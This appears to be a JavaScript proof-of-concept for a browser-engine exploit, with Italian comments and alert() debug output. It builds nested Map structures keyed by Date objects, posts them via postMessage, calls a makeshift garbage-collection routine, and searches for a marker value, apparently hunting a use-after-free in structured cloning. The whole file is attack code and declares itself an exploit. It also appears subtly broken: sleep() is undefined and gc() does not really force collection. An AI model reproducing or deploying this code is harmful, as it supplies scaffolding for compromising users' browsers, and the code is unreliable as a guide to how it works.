function gc() {
    try {
        new Uint8Array(256 * 1024);  // Allocazione controllata
        alert('Garbage Collection eseguita');
    } catch (e) {
        alert("Errore durante Garbage Collection: " + e.message);
    }
}

function createObjectStructure(num_elems) {
    alert("Inizio creazione struttura di oggetti...");
    let root = new Map();
    let msg = root;
    let foo = [];

    // Riempire array con oggetti Date
    for (let i = 0; i < 5; i++) {
        foo.push(new Date(0xffff));
    }
    alert("Array foo popolato.");

    // Creazione struttura Map
    for (let i = 0; i < num_elems; i++) {
        const d = new Date(i);
        const map = new Map();
        msg.set(d, [map, foo]);
        msg = map;
    }
    alert("Struttura Map creata con successo.");

    gc();  // Esegui Garbage Collection
    alert('Struttura di oggetti creata');
    return root;
}

export async function main() {
    alert("Inizio exploit");

    const num_elems = 5;
    let root = createObjectStructure(num_elems);
    let msg = root;

    alert("Oggetto struttura creata");

    let found = false;
    while (!found) {
        let data = null;
        const prom = new Promise(resolve => {
            addEventListener('message', event => {
                data = event;
                resolve();
            }, { once: true });
        });

        alert("Postando messaggio...");
        try {
            postMessage(msg, origin);
        } catch (e) {
            alert("Errore durante postMessage: " + e.message);
            break;
        }
        alert("Messaggio postato.");

        await prom;  // Aspetta il messaggio
        alert("Messaggio ricevuto.");

        data = data.data;

        gc();  // Esegui Garbage Collection
        alert("GC dopo messaggio.");

        await sleep(100);

        try {
            alert("Cercando l'indice...");
            for (let i = 0; i < num_elems; i++) {
                if (data.keys().next().value.getTime() === 0xffff) {
                    alert("Indice trovato: " + i);
                    found = true;
                    break;
                }
                data = data.values().next().value[0];
            }
        } catch (e) {
            alert("Errore durante la ricerca dell'indice: " + e.message);
            break;
        }
    }

    if (found) {
        alert("[+] Exploit riuscito.");
    } else {
        alert("[-] Exploit fallito.");
    }
}
